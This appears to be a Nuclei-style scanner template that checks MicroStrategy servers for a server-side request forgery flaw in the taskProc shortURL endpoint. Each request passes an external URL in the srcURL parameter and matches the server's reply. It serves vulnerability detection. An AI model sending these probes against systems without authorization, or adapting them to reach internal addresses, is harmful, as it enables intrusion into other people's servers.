id: microstrategy-ssrf
info:
  author: organiccrap
  name: MicroStrategy tinyurl SSRF
  severity: high
requests:
- headers:
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101
      Firefox/55
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - taskResponse
    - The source URL is not valid
  method: GET
  path:
  - '{{BaseURL}}/servlet/taskProc?taskId=shortURL&taskEnv=xml&taskContentType=xml&srcURL=https://google.com'
  - '{{BaseURL}}/MicroStrategy/servlet/taskProc?taskId=shortURL&taskEnv=xml&taskContentType=xml&srcURL=https://google.com'
